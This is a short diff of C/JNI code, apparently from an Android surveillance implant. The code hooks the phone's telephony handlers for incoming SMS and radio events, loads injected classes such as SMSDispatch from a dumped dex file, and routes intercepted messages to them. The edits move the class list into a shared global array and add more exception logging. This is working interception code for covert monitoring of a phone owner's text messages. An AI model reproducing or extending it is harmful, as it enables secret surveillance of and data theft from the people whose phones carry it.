@@ -454,6 +454,18 @@ static int load_dext(char * dext_path,char **classes)
 
    return res;
 }
+char *classes[] = {
+         "com/android/dvci/event/OOB/SMSDispatch",
+         "com/android/dvci/util/Reflect",
+         "com/android/dvci/util/LowEventHandlerDefs",
+         "com/android/dvci/util/ReflectException",
+         "com/android/dvci/auto/Cfg",
+         "com/android/dvci/file/AutoFile",
+         "com/android/dvci/file/Path",
+         "com/android/dvci/util/Check",
+         "com/android/internal/telephony/GsmAlphabet",
+         "com/android/dvci/util/DateTime",
+         NULL };
 //private void processUnsolicited (Parcel p)
 static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 {
@@ -473,7 +485,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
    */
    //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
    (*env)->MonitorEnter(env,this);
-   char *classes[] = { "com/android/dvci/event/OOB/SMSDispatch", "com/android/dvci/util/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
+
    if (processUnsolicited_cache.cls_h == 0) {
       if (load_dext(dumpPath, classes)) {
          log("failed to load class ");
@@ -506,6 +518,8 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
    if ((*env)->ExceptionOccurred(env)) {
       log("got an exception!!");
       (*env)->ExceptionDescribe(env);
+      //dalvik_dump_class(&d,"");
+      log("<-- description");
       (*env)->ExceptionClear(env);
    }
    (*env)->MonitorExit(env,this);
@@ -515,7 +529,9 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 
       (*env)->CallVoidMethod(env, this, processUnsolicited_dh.mid, p);
       if ((*env)->ExceptionOccurred(env)) {
-         log("got an exception!!");
+         log("got an exception calling orig");
+         (*env)->ExceptionDescribe(env);
+         log("<-- description");
          (*env)->ExceptionClear(env);
       } else {
          //log("success calling : %s\n", processUnsolicited_dh.method_name)
@@ -531,12 +547,7 @@ static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
 static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessageBase)
 {
    jint callOrig = 1;
-      char *classes[]={
-            "com/android/dvci/event/OOB/SMSDispatch",
-            "com/android/dvci/util/Reflect",
-            "com/android/dvci/util/LowEventHandlerDefs",
-            NULL
-      };
+
       if (load_dext(dumpPath,classes)) {
          log("failed to load class ");
       } else {
@@ -601,7 +612,7 @@ static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject
 {
    int callOrig = 1;
    log("we are in!");
-   if (load_dext(dumpPath,NULL)) {
+   if (load_dext(dumpPath,classes)) {
       log("failed to load class ");
    } else {
       // call static method and passin the sms
